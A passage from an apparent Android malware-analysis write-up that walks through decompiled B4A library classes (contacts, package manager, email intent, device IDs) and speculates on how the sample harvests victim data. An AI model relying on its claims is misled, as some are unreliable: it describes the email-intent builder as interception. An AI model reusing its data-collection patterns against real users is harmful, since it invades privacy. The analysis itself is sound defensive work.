                <span class="n">Cursor</span> <span class="n">query</span> <span class="p">=</span> <span class="n">BA</span><span class="p">.</span><span class="n">applicationContext</span><span class="p">.</span><span class="nf">getContentResolver</span><span class="p">().</span><span class="nf">query</span><span class="p">(</span><span class="n">Uri</span><span class="p">.</span><span class="nf">withAppendedPath</span><span class="p">(</span><span class="n">ContentUris</span><span class="p">.</span><span class="nf">withAppendedId</span><span class="p">(</span><span class="n">Contacts</span><span class="p">.</span><span class="n">People</span><span class="p">.</span><span class="n">CONTENT_URI</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">Id</span><span class="p">),</span> <span class="s">"contact_methods"</span><span class="p">),</span> <span class="k">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s">"data"</span><span class="p">,</span> <span class="s">"type"</span><span class="p">,</span> <span class="s">"kind"</span><span class="p">},</span> <span class="s">"kind = 1"</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="n">Map</span> <span class="n">map</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Map</span><span class="p">();</span>
                <span class="n">map</span><span class="p">.</span><span class="nf">Initialize</span><span class="p">();</span>
                <span class="k">while</span> <span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">moveToNext</span><span class="p">())</span> <span class="p">{</span>
                    <span class="n">map</span><span class="p">.</span><span class="nf">Put</span><span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="m">0</span><span class="p">),</span> <span class="n">Integer</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">getInt</span><span class="p">(</span><span class="m">1</span><span class="p">)));</span>
                <span class="p">}</span>
                <span class="n">query</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
                <span class="k">return</span> <span class="n">map</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="p">(</span><span class="s">"Contact object should be set by calling one of the Contacts methods."</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="n">Map</span> <span class="nf">GetPhones</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">Id</span> <span class="p">!=</span> <span class="p">-</span><span class="m">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">Cursor</span> <span class="n">query</span> <span class="p">=</span> <span class="n">BA</span><span class="p">.</span><span class="n">applicationContext</span><span class="p">.</span><span class="nf">getContentResolver</span><span class="p">().</span><span class="nf">query</span><span class="p">(</span><span class="n">Uri</span><span class="p">.</span><span class="nf">withAppendedPath</span><span class="p">(</span><span class="n">ContentUris</span><span class="p">.</span><span class="nf">withAppendedId</span><span class="p">(</span><span class="n">Contacts</span><span class="p">.</span><span class="n">People</span><span class="p">.</span><span class="n">CONTENT_URI</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">Id</span><span class="p">),</span> <span class="s">"phones"</span><span class="p">),</span> <span class="k">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s">"number"</span><span class="p">,</span> <span class="s">"type"</span><span class="p">},</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="n">Map</span> <span class="n">map</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Map</span><span class="p">();</span>
                <span class="n">map</span><span class="p">.</span><span class="nf">Initialize</span><span class="p">();</span>
                <span class="k">while</span> <span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">moveToNext</span><span class="p">())</span> <span class="p">{</span>
                    <span class="n">map</span><span class="p">.</span><span class="nf">Put</span><span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="m">0</span><span class="p">),</span> <span class="n">Integer</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">getInt</span><span class="p">(</span><span class="m">1</span><span class="p">)));</span>
                <span class="p">}</span>
                <span class="n">query</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
                <span class="k">return</span> <span class="n">map</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="p">(</span><span class="s">"Contact object should be set by calling one of the Contacts methods."</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="n">CanvasWrapper</span><span class="p">.</span><span class="n">BitmapWrapper</span> <span class="nf">GetPhoto</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">Id</span> <span class="p">!=</span> <span class="p">-</span><span class="m">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">Cursor</span> <span class="n">query</span> <span class="p">=</span> <span class="n">BA</span><span class="p">.</span><span class="n">applicationContext</span><span class="p">.</span><span class="nf">getContentResolver</span><span class="p">().</span><span class="nf">query</span><span class="p">(</span><span class="n">Uri</span><span class="p">.</span><span class="nf">withAppendedPath</span><span class="p">(</span><span class="n">ContentUris</span><span class="p">.</span><span class="nf">withAppendedId</span><span class="p">(</span><span class="n">Contacts</span><span class="p">.</span><span class="n">People</span><span class="p">.</span><span class="n">CONTENT_URI</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">Id</span><span class="p">),</span> <span class="s">"photo"</span><span class="p">),</span> <span class="k">new</span> <span class="n">String</span><span class="p">[]{</span><span class="s">"data"</span><span class="p">},</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="n">CanvasWrapper</span><span class="p">.</span><span class="n">BitmapWrapper</span> <span class="n">bitmapWrapper</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">moveToNext</span><span class="p">())</span> <span class="p">{</span>
                    <span class="kt">byte</span><span class="p">[]</span> <span class="n">blob</span> <span class="p">=</span> <span class="n">query</span><span class="p">.</span><span class="nf">getBlob</span><span class="p">(</span><span class="m">0</span><span class="p">);</span>
                    <span class="n">bitmapWrapper</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">blob</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">File</span><span class="p">.</span><span class="n">InputStreamWrapper</span> <span class="n">inputStreamWrapper</span> <span class="p">=</span> <span class="k">new</span> <span class="n">File</span><span class="p">.</span><span class="nf">InputStreamWrapper</span><span class="p">();</span>
                        <span class="n">inputStreamWrapper</span><span class="p">.</span><span class="nf">InitializeFromBytesArray</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">blob</span><span class="p">.</span><span class="n">length</span><span class="p">);</span>
                        <span class="n">bitmapWrapper</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CanvasWrapper</span><span class="p">.</span><span class="nf">BitmapWrapper</span><span class="p">();</span>
                        <span class="n">bitmapWrapper</span><span class="p">.</span><span class="nf">Initialize2</span><span class="p">(</span><span class="n">inputStreamWrapper</span><span class="p">.</span><span class="nf">getObject</span><span class="p">());</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="n">query</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
                <span class="k">return</span> <span class="n">bitmapWrapper</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="p">(</span><span class="s">"Contact object should be set by calling one of the Contacts methods."</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">return</span> <span class="s">"DisplayName="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">DisplayName</span> <span class="p">+</span> <span class="s">", PhoneNumber="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">PhoneNumber</span> <span class="p">+</span> <span class="s">", Starred="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">Starred</span> <span class="p">+</span> <span class="s">", Id="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">Id</span> <span class="p">+</span> <span class="s">", Notes="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">Notes</span> <span class="p">+</span> <span class="s">", TimesContacted="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">TimesContacted</span> <span class="p">+</span> <span class="s">", LastTimeContacted="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">LastTimeContacted</span> <span class="p">+</span> <span class="s">", Name="</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="n">Name</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="n">List</span> <span class="nf">getAllContacts</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">,</span> <span class="n">String</span><span class="p">[]</span> <span class="n">strArr</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">Cursor</span> <span class="n">query</span> <span class="p">=</span> <span class="n">BA</span><span class="p">.</span><span class="n">applicationContext</span><span class="p">.</span><span class="nf">getContentResolver</span><span class="p">().</span><span class="nf">query</span><span class="p">(</span><span class="n">Contacts</span><span class="p">.</span><span class="n">People</span><span class="p">.</span><span class="n">CONTENT_URI</span><span class="p">,</span> <span class="n">people_projection</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="n">strArr</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
        <span class="n">List</span> <span class="n">list</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">List</span><span class="p">();</span>
        <span class="n">list</span><span class="p">.</span><span class="nf">Initialize</span><span class="p">();</span>
        <span class="n">HashMap</span> <span class="n">hashMap</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">HashMap</span><span class="p">();</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">query</span><span class="p">.</span><span class="nf">getColumnCount</span><span class="p">();</span> <span class="n">i</span><span class="p">++)</span> <span class="p">{</span>
            <span class="n">hashMap</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">getColumnName</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="n">Integer</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">i</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">moveToNext</span><span class="p">())</span> <span class="p">{</span>
            <span class="n">list</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="k">new</span> <span class="nf">Contact</span><span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">getString</span><span class="p">(((</span><span class="n">Integer</span><span class="p">)</span> <span class="n">hashMap</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s">"display_name"</span><span class="p">)).</span><span class="nf">intValue</span><span class="p">()),</span> <span class="n">query</span><span class="p">.</span><span class="nf">getString</span><span class="p">(((</span><span class="n">Integer</span><span class="p">)</span> <span class="n">hashMap</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s">"number"</span><span class="p">)).</span><span class="nf">intValue</span><span class="p">()),</span> <span class="n">query</span><span class="p">.</span><span class="nf">getInt</span><span class="p">(((</span><span class="n">Integer</span><span class="p">)</span> <span class="n">hashMap</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s">"starred"</span><span class="p">)).</span><span class="nf">intValue</span><span class="p">())</span> <span class="p">&gt;</span> <span class="m">0</span><span class="p">,</span> <span class="n">query</span><span class="p">.</span><span class="nf">getInt</span><span class="p">(((</span><span class="n">Integer</span><span class="p">)</span> <span class="n">hashMap</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s">"_id"</span><span class="p">)).</span><span class="nf">intValue</span><span class="p">()),</span> <span class="n">query</span><span class="p">.</span><span class="nf">getString</span><span class="p">(((</span><span class="n">Integer</span><span class="p">)</span> <span class="n">hashMap</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s">"notes"</span><span class="p">)).</span><span class="nf">intValue</span><span class="p">()),</span> <span class="n">query</span><span class="p">.</span><span class="nf">getInt</span><span class="p">(((</span><span class="n">Integer</span><span class="p">)</span> <span class="n">hashMap</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s">"times_contacted"</span><span class="p">)).</span><span class="nf">intValue</span><span class="p">()),</span> <span class="n">query</span><span class="p">.</span><span class="nf">getLong</span><span class="p">(((</span><span class="n">Integer</span><span class="p">)</span> <span class="n">hashMap</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s">"last_time_contacted"</span><span class="p">)).</span><span class="nf">intValue</span><span class="p">()),</span> <span class="n">query</span><span class="p">.</span><span class="nf">getString</span><span class="p">(((</span><span class="n">Integer</span><span class="p">)</span> <span class="n">hashMap</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="n">AppMeasurementSdk</span><span class="p">.</span><span class="n">ConditionalUserProperty</span><span class="p">.</span><span class="n">NAME</span><span class="p">)).</span><span class="nf">intValue</span><span class="p">())));</span>
        <span class="p">}</span>
        <span class="n">query</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
        <span class="k">return</span> <span class="n">list</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>But this class is not used by any classes too.</p>

<p>We go to <code class="language-plaintext highlighter-rouge">PackageManager</code> class. Which will retrive the information about all installed packages on the victim’s phone such as <code class="language-plaintext highlighter-rouge">name</code> and <code class="language-plaintext highlighter-rouge">version code</code>. Maybe for <code class="language-plaintext highlighter-rouge">overlay</code> attack The malware opens an active window over a legitimate program. The opened malicious window is the same as the legitimate program. the victim will try to enter his/her credintial. The malware can steal the victim’s credential data such as payment data or login data.</p>

<p>But there’s no indication of this attack in this malware.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">@BA</span><span class="p">.</span><span class="nf">ShortName</span><span class="p">(</span><span class="s">"PackageManager"</span><span class="p">)</span>
<span class="cm">/* loaded from: classes-dex2jar.jar:anywheresoftware/b4a/phone/PackageManagerWrapper.class */</span>
<span class="k">public</span> <span class="k">class</span> <span class="nc">PackageManagerWrapper</span> <span class="p">{</span>
    <span class="k">private</span> <span class="n">PackageManager</span> <span class="n">pm</span> <span class="p">=</span> <span class="n">BA</span><span class="p">.</span><span class="n">applicationContext</span><span class="p">.</span><span class="nf">getPackageManager</span><span class="p">();</span>

    <span class="k">public</span> <span class="n">Drawable</span> <span class="nf">GetApplicationIcon</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">)</span> <span class="n">throws</span> <span class="n">PackageManager</span><span class="p">.</span><span class="n">NameNotFoundException</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="n">pm</span><span class="p">.</span><span class="nf">getApplicationIcon</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="n">IntentWrapper</span> <span class="nf">GetApplicationIntent</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">IntentWrapper</span> <span class="n">intentWrapper</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">IntentWrapper</span><span class="p">();</span>
        <span class="n">intentWrapper</span><span class="p">.</span><span class="nf">setObject</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">pm</span><span class="p">.</span><span class="nf">getLaunchIntentForPackage</span><span class="p">(</span><span class="n">str</span><span class="p">));</span>
        <span class="k">return</span> <span class="n">intentWrapper</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="n">String</span> <span class="nf">GetApplicationLabel</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">)</span> <span class="n">throws</span> <span class="n">PackageManager</span><span class="p">.</span><span class="n">NameNotFoundException</span> <span class="p">{</span>
        <span class="n">PackageManager</span> <span class="n">packageManager</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">pm</span><span class="p">;</span>
        <span class="n">CharSequence</span> <span class="n">applicationLabel</span> <span class="p">=</span> <span class="n">packageManager</span><span class="p">.</span><span class="nf">getApplicationLabel</span><span class="p">(</span><span class="n">packageManager</span><span class="p">.</span><span class="nf">getApplicationInfo</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="m">0</span><span class="p">));</span>
        <span class="k">return</span> <span class="n">applicationLabel</span> <span class="p">==</span> <span class="k">null</span> <span class="p">?</span> <span class="s">""</span> <span class="p">:</span> <span class="n">applicationLabel</span><span class="p">.</span><span class="nf">toString</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="n">List</span> <span class="nf">GetInstalledPackages</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">List</span> <span class="n">list</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">List</span><span class="p">();</span>
        <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">List</span><span class="p">&lt;</span><span class="n">PackageInfo</span><span class="p">&gt;</span> <span class="n">installedPackages</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">pm</span><span class="p">.</span><span class="nf">getInstalledPackages</span><span class="p">(</span><span class="m">0</span><span class="p">);</span>
        <span class="n">list</span><span class="p">.</span><span class="nf">Initialize</span><span class="p">();</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">PackageInfo</span> <span class="n">packageInfo</span> <span class="p">:</span> <span class="n">installedPackages</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">list</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="n">packageInfo</span><span class="p">.</span><span class="n">packageName</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">list</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="kt">int</span> <span class="nf">GetVersionCode</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">)</span> <span class="n">throws</span> <span class="n">PackageManager</span><span class="p">.</span><span class="n">NameNotFoundException</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="n">pm</span><span class="p">.</span><span class="nf">getPackageInfo</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="m">0</span><span class="p">).</span><span class="n">versionCode</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="n">String</span> <span class="nf">GetVersionName</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">)</span> <span class="n">throws</span> <span class="n">PackageManager</span><span class="p">.</span><span class="n">NameNotFoundException</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="n">pm</span><span class="p">.</span><span class="nf">getPackageInfo</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="m">0</span><span class="p">).</span><span class="n">versionName</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="n">List</span> <span class="nf">QueryIntentActivities</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">List</span><span class="p">&lt;</span><span class="n">ResolveInfo</span><span class="p">&gt;</span> <span class="n">queryIntentActivities</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">pm</span><span class="p">.</span><span class="nf">queryIntentActivities</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="m">0</span><span class="p">);</span>
        <span class="n">List</span> <span class="n">list</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">List</span><span class="p">();</span>
        <span class="n">list</span><span class="p">.</span><span class="nf">Initialize</span><span class="p">();</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">ResolveInfo</span> <span class="n">resolveInfo</span> <span class="p">:</span> <span class="n">queryIntentActivities</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">list</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="k">new</span> <span class="nf">ComponentName</span><span class="p">(</span><span class="n">resolveInfo</span><span class="p">.</span><span class="n">activityInfo</span><span class="p">.</span><span class="n">packageName</span><span class="p">,</span> <span class="n">resolveInfo</span><span class="p">.</span><span class="n">activityInfo</span><span class="p">.</span><span class="n">name</span><span class="p">).</span><span class="nf">flattenToShortString</span><span class="p">());</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">list</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>And this class is not used by any classes too.</p>

<p>We go for <code class="language-plaintext highlighter-rouge">phone</code> class. The malware collects more info about the victim’s phone such as the state of the phone if it’s <code class="language-plaintext highlighter-rouge">RINGER_SILENT</code> or <code class="language-plaintext highlighter-rouge">RINGER_NORMAL</code> and more. 
The malware will try to intercept the Emails which comes to the victim’s phone. The malware collects the sender email, receiver email and body and more.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">@BA</span><span class="p">.</span><span class="nf">ShortName</span><span class="p">(</span><span class="s">"Email"</span><span class="p">)</span>
    <span class="cm">/* loaded from: classes-dex2jar.jar:anywheresoftware/b4a/phone/Phone$Email.class */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">Email</span> <span class="p">{</span>
        <span class="k">public</span> <span class="n">String</span> <span class="n">Subject</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">String</span> <span class="n">Body</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
        <span class="k">public</span> <span class="n">List</span> <span class="n">To</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">List</span><span class="p">();</span>
        <span class="k">public</span> <span class="n">List</span> <span class="n">CC</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">List</span><span class="p">();</span>
        <span class="k">public</span> <span class="n">List</span> <span class="n">BCC</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">List</span><span class="p">();</span>
        <span class="k">public</span> <span class="n">List</span> <span class="n">Attachments</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">List</span><span class="p">();</span>

        <span class="k">public</span> <span class="nf">Email</span><span class="p">()</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="n">To</span><span class="p">.</span><span class="nf">Initialize</span><span class="p">();</span>
            <span class="k">this</span><span class="p">.</span><span class="n">CC</span><span class="p">.</span><span class="nf">Initialize</span><span class="p">();</span>
            <span class="k">this</span><span class="p">.</span><span class="n">BCC</span><span class="p">.</span><span class="nf">Initialize</span><span class="p">();</span>
            <span class="k">this</span><span class="p">.</span><span class="n">Attachments</span><span class="p">.</span><span class="nf">Initialize</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">private</span> <span class="n">Intent</span> <span class="nf">getIntent</span><span class="p">(</span><span class="n">boolean</span> <span class="n">z</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">Intent</span> <span class="n">intent</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Intent</span><span class="p">(</span><span class="s">"android.intent.action.SEND_MULTIPLE"</span><span class="p">);</span>
            <span class="n">intent</span><span class="p">.</span><span class="nf">setType</span><span class="p">(</span><span class="n">z</span> <span class="p">?</span> <span class="s">"text/html"</span> <span class="p">:</span> <span class="s">"text/plain"</span><span class="p">);</span>
            <span class="n">intent</span><span class="p">.</span><span class="nf">putExtra</span><span class="p">(</span><span class="s">"android.intent.extra.EMAIL"</span><span class="p">,</span> <span class="p">(</span><span class="n">String</span><span class="p">[])</span> <span class="k">this</span><span class="p">.</span><span class="n">To</span><span class="p">.</span><span class="nf">getObject</span><span class="p">().</span><span class="nf">toArray</span><span class="p">(</span><span class="k">new</span> <span class="n">String</span><span class="p">[</span><span class="m">0</span><span class="p">]));</span>
            <span class="n">intent</span><span class="p">.</span><span class="nf">putExtra</span><span class="p">(</span><span class="s">"android.intent.extra.CC"</span><span class="p">,</span> <span class="p">(</span><span class="n">String</span><span class="p">[])</span> <span class="k">this</span><span class="p">.</span><span class="n">CC</span><span class="p">.</span><span class="nf">getObject</span><span class="p">().</span><span class="nf">toArray</span><span class="p">(</span><span class="k">new</span> <span class="n">String</span><span class="p">[</span><span class="m">0</span><span class="p">]));</span>
            <span class="n">intent</span><span class="p">.</span><span class="nf">putExtra</span><span class="p">(</span><span class="s">"android.intent.extra.BCC"</span><span class="p">,</span> <span class="p">(</span><span class="n">String</span><span class="p">[])</span> <span class="k">this</span><span class="p">.</span><span class="n">BCC</span><span class="p">.</span><span class="nf">getObject</span><span class="p">().</span><span class="nf">toArray</span><span class="p">(</span><span class="k">new</span> <span class="n">String</span><span class="p">[</span><span class="m">0</span><span class="p">]));</span>
            <span class="n">intent</span><span class="p">.</span><span class="nf">putExtra</span><span class="p">(</span><span class="s">"android.intent.extra.SUBJECT"</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="n">Subject</span><span class="p">);</span>
            <span class="n">intent</span><span class="p">.</span><span class="nf">putExtra</span><span class="p">(</span><span class="s">"android.intent.extra.TEXT"</span><span class="p">,</span> <span class="n">z</span> <span class="p">?</span> <span class="n">Html</span><span class="p">.</span><span class="nf">fromHtml</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">Body</span><span class="p">)</span> <span class="p">:</span> <span class="k">this</span><span class="p">.</span><span class="n">Body</span><span class="p">);</span>
            <span class="n">ArrayList</span><span class="p">&lt;?</span> <span class="n">extends</span> <span class="n">Parcelable</span><span class="p">&gt;</span> <span class="n">arrayList</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="p">&lt;&gt;();</span>
            <span class="k">for</span> <span class="p">(</span><span class="n">Object</span> <span class="n">obj</span> <span class="p">:</span> <span class="k">this</span><span class="p">.</span><span class="n">Attachments</span><span class="p">.</span><span class="nf">getObject</span><span class="p">())</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">obj</span> <span class="n">instanceof</span> <span class="n">Uri</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">arrayList</span><span class="p">.</span><span class="k">add</span><span class="p">((</span><span class="n">Uri</span><span class="p">)</span> <span class="n">obj</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="n">arrayList</span><span class="p">.</span><span class="k">add</span><span class="p">(</span><span class="n">Uri</span><span class="p">.</span><span class="nf">fromFile</span><span class="p">(</span><span class="k">new</span> <span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="nf">File</span><span class="p">((</span><span class="n">String</span><span class="p">)</span> <span class="n">obj</span><span class="p">)));</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">arrayList</span><span class="p">.</span><span class="nf">size</span><span class="p">()</span> <span class="p">==</span> <span class="m">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">intent</span><span class="p">.</span><span class="nf">putExtra</span><span class="p">(</span><span class="s">"android.intent.extra.STREAM"</span><span class="p">,</span> <span class="n">arrayList</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="m">0</span><span class="p">));</span>
                <span class="n">intent</span><span class="p">.</span><span class="nf">setAction</span><span class="p">(</span><span class="n">IntentWrapper</span><span class="p">.</span><span class="n">ACTION_SEND</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">arrayList</span><span class="p">.</span><span class="nf">size</span><span class="p">()</span> <span class="p">&gt;</span> <span class="m">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">intent</span><span class="p">.</span><span class="nf">putParcelableArrayListExtra</span><span class="p">(</span><span class="s">"android.intent.extra.STREAM"</span><span class="p">,</span> <span class="n">arrayList</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="n">intent</span><span class="p">;</span>
        <span class="p">}</span>
</code></pre></div></div>
<p>Then the malware will collect info about SIM such as <code class="language-plaintext highlighter-rouge">Sim Serial Number</code>, <code class="language-plaintext highlighter-rouge">Device Id</code>, <code class="language-plaintext highlighter-rouge">Subscriber Id</code>.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">@BA</span><span class="p">.</span><span class="nf">ShortName</span><span class="p">(</span><span class="s">"PhoneId"</span><span class="p">)</span>
    <span class="cm">/* loaded from: classes-dex2jar.jar:anywheresoftware/b4a/phone/Phone$PhoneId.class */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">PhoneId</span> <span class="p">{</span>
        <span class="k">public</span> <span class="k">static</span> <span class="n">String</span> <span class="nf">GetDeviceId</span><span class="p">()</span> <span class="p">{</span>
            <span class="n">String</span> <span class="n">deviceId</span> <span class="p">=</span> <span class="p">((</span><span class="n">TelephonyManager</span><span class="p">)</span> <span class="n">BA</span><span class="p">.</span><span class="n">applicationContext</span><span class="p">.</span><span class="nf">getSystemService</span><span class="p">(</span><span class="s">"phone"</span><span class="p">)).</span><span class="nf">getDeviceId</span><span class="p">();</span>
